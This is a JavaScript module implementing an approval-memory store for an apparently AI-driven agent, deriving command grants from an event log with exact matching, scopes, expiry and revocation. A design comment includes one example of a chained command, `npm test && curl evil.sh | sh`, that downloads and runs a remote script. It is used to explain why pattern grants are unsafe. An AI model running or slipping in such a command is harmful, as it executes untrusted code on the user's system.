// W6 M — the grant store: approval memory, as a DERIVED projection over the event log.
//
// WHY THIS IS REQUIRED AND NOT OPTIONAL (plan §10.2 W6-M)
//
// An approval that is forgotten at the end of a turn is not an approval — it is a prompt. Without
// memory, "autonomous execution" means being asked about `npm test` on turn 3, turn 7 and turn 12
// of the same task, which trains the operator to approve without reading. That is worse than
// asking once, because it manufactures consent. The plan states the dependency directly: never
// ship K without M, because autonomy whose approvals reset every turn is not autonomy.
//
// G and M answer different questions and both are needed:
//   G — CAN this be auto-allowed? (a property of the boundary the command runs inside)
//   M — WAS this already approved, and does that still hold? (a property of what a human decided)
//
// WHY EVENTS, NOT A TABLE
//
// Same reason as resources (§9.3). A grant decides whether a future effect is permitted, so it is
// exactly the kind of fact that must be reconstructible by replay rather than read out of mutable
// state beside the log. A grants table would make an authorization decision depend on whatever
// the table happened to hold at read time, and a replayed run could then reach a different
// decision than the original — which would make the trajectory a story rather than a record.
//
// CROSS-RUN SCOPE, WITHOUT LEAVING THE LOG
//
// A project-scoped grant must outlive the run that created it, and events are per-run. The
// resolution is a cross-run QUERY over grant events (`Store.grantEvents`), not a second store:
// the events remain the only source of truth and the query is an index into them, not state
// beside them.
//
// WHY MATCHING IS EXACT AND NOT GLOB
//
// The obvious design is to grant a pattern like `npm *`. It is also how this becomes a
// vulnerability: `npm test` and `npm test && curl evil.sh | sh` both match `npm *`, and the
// second is a different command with a different meaning. Grants therefore match a NORMALISED
// EXACT command string. The cost is that `npm test -- --watch` needs its own approval; that is
// the correct trade, and it is why the normalisation below only touches whitespace and never
// structure.

import crypto from 'node:crypto';

/** What a grant is scoped to. Ordered narrowest to broadest. */
export const GrantScope = Object.freeze({
  /** This run only. The default, and the weakest thing "approve" can mean. */
  SESSION: 'session',
  /** This resource — dies with the sandbox it was granted against. */
  RESOURCE: 'resource',
  /** This project directory, across runs. What makes "npm test" a one-time question. */
  PROJECT: 'project',
  /** A command pattern within a project. Broadest; the operator is opting into standing consent. */
  COMMAND_PATTERN: 'command_pattern',
});

const SCOPES = new Set(Object.values(GrantScope));

/**
 * Normalise a command for grant matching.
 *
 * Whitespace only. Deliberately NOT: lowercasing (paths and flags are case-sensitive on the
 * platforms that matter), quote stripping, or operator rewriting — each of those would let two
 * genuinely different commands collapse onto one grant.
 */
export function normaliseCommand(cmd) {
  return String(cmd ?? '').trim().replace(/\s+/g, ' ');
}

/** Canonicalise a project path so the same directory always yields the same grant scope. */
export function projectKey(root) {
  if (!root) return null;
  return String(root).replace(/[\\/]+$/, '').replace(/\\/g, '/').toLowerCase();
}

/** A stable id, so the same approval recorded twice is recognisably the same grant. */
export function grantId({ scope, tool, command, project, resourceId }) {
  const h = crypto.createHash('sha256')
    .update(String(scope)).update('\0')
    .update(String(tool ?? '')).update('\0')
    .update(normaliseCommand(command)).update('\0')
    .update(String(projectKey(project) ?? '')).update('\0')
    .update(String(resourceId ?? ''))
    .digest('hex').slice(0, 16);
  return `grant_${h}`;
}

/**
 * Build a `grant.created` payload. Validates here so a malformed grant cannot reach the log —
 * an unparseable grant would be indistinguishable from an absent one at authorization time, and
 * failing open is the wrong direction for this particular record.
 */
/** @param {{ scope?: string, tool?: string|null, command?: string|null, project?: string|null,
 *             resourceId?: string|null, runId?: string|null, decidedBy?: string,
 *             reason?: string|null, expiresAt?: number|null }} [opts] */
export function describeGrant({
  scope = /** @type {string} */ (GrantScope.SESSION),
  tool = null,
  command = null,
  project = null,
  resourceId = null,
  runId = null,
  decidedBy = 'human',
  reason = null,
  expiresAt = null,
} = {}) {
  if (!SCOPES.has(/** @type {any} */ (scope))) throw new Error(`unknown grant scope: ${scope}`);
  if (!tool && !command) throw new Error('a grant must name a tool or a command');
  if (scope === GrantScope.PROJECT && !project)
    throw new Error('a project-scoped grant needs a project');
  if (scope === GrantScope.RESOURCE && !resourceId)
    throw new Error('a resource-scoped grant needs a resource_id');
  if (scope === GrantScope.SESSION && !runId)
    throw new Error('a session-scoped grant needs a run_id');

  const command_norm = command === null ? null : normaliseCommand(command);
  return {
    grant_id: grantId({ scope, tool, command, project, resourceId }),
    scope, tool,
    command: command_norm,
    project: projectKey(project),
    resource_id: resourceId,
    run_id: runId,
    // Attribution is part of the record: an approval nobody can be traced to is not auditable,
    // and "the model approved it" must be distinguishable from "a person approved it".
    decided_by: decidedBy,
    reason,
    expires_at: expiresAt,
  };
}

/**
 * Fold grant events into the set of currently-active grants.
 *
 * @param {Array<{type:string, payload?:any, at?:number, run_id?:string}>} events
 * @param {{now?: number}} [opts]
 */
export function projectGrants(events, { now = Date.now() } = {}) {
  /** @type {Record<string, any>} */
  const grants = {};
  for (const e of events ?? []) {
    const p = e?.payload ?? {};
    if (e?.type === 'grant.created') {
      if (!p.grant_id) continue;
      // A revocation is ABSORBING: once withdrawn, a grant stays withdrawn, whatever order the
      // events arrive in. This is not hypothetical ordering pedantry — `grantEvents` sorts by
      // `(at, seq)` across runs, and two events written in the same millisecond in different runs
      // have no guaranteed relative order. Without this guard, a create merged after a revoke
      // would silently resurrect an approval a human explicitly took away, which is the worst
      // direction for this particular record to fail in.
      //
      // Re-granting is still possible; it just has to be a NEW decision. Grant ids are derived
      // from the approval's content, so re-approving the identical command yields the same id —
      // which is why the tombstone has to be explicit rather than implied by recency.
      const existing = grants[p.grant_id];
      if (existing?.revoked) continue;
      grants[p.grant_id] = { ...p, revoked: false, revoked_reason: null,
                             created_at: e.at ?? null, created_in_run: e.run_id ?? p.run_id ?? null };
    } else if (e?.type === 'grant.revoked') {
      if (!p.grant_id) continue;
      const g = grants[p.grant_id];
      // A revoke may legitimately arrive for a grant this fold has not seen (a narrower query,
      // a snapshot boundary). Record it as a tombstone so a later-merged create cannot resurrect
      // something a human explicitly withdrew.
      grants[p.grant_id] = { ...(g ?? { grant_id: p.grant_id }), revoked: true,
                             revoked_reason: p.reason ?? null, revoked_at: e.at ?? null };
    }
  }
  const active = Object.values(grants).filter(g =>
    !g.revoked && (!g.expires_at || g.expires_at > now));
  return { grants, active };
}

/**
 * Does `grant` authorise `action` in `ctx`?
 *
 * Every branch is a conjunction: a grant must match on scope AND on what it covers. There is no
 * "close enough" path, because the failure mode of a loose match here is silently running a
 * command nobody approved.
 */
export function grantCovers(grant, action, ctx = {}) {
  if (!grant || grant.revoked) return false;
  if (grant.expires_at && grant.expires_at <= (ctx.now ?? Date.now())) return false;

  // Scope must hold.
  switch (grant.scope) {
    case GrantScope.SESSION:
      if (!ctx.run_id || grant.run_id !== ctx.run_id) return false;
      break;
    case GrantScope.RESOURCE:
      if (!ctx.resource_id || grant.resource_id !== ctx.resource_id) return false;
      break;
    case GrantScope.PROJECT:
    case GrantScope.COMMAND_PATTERN:
      if (!ctx.project || grant.project !== projectKey(ctx.project)) return false;
      break;
    default:
      return false;   // an unknown scope authorises nothing
  }

  // What it covers must hold.
  if (grant.command !== null && grant.command !== undefined) {
    if (typeof action?.command !== 'string') return false;
    if (normaliseCommand(action.command) !== grant.command) return false;
  }
  if (grant.tool !== null && grant.tool !== undefined) {
    if (action?.name !== grant.tool) return false;
  }
  return true;
}

/** The first active grant covering this action, or null. */
export function findGrant(events, action, ctx = {}) {
  const { active } = projectGrants(events, { now: ctx.now });
  return active.find(g => grantCovers(g, action, ctx)) ?? null;
}

/** One-line summaries, for `explain` and `orionctl grants`. */
export function summariseGrants(events, { now = Date.now() } = {}) {
  const { active } = projectGrants(events, { now });
  if (!active.length) return null;
  return active.map(g =>
    `${g.grant_id}  ${g.scope.padEnd(15)} ${g.command ?? `tool:${g.tool}`}`
    + (g.project ? `  [${g.project}]` : '')
    + (g.expires_at ? `  expires ${new Date(g.expires_at).toISOString()}` : '')
    + `  by ${g.decided_by}`).join('\n');
}
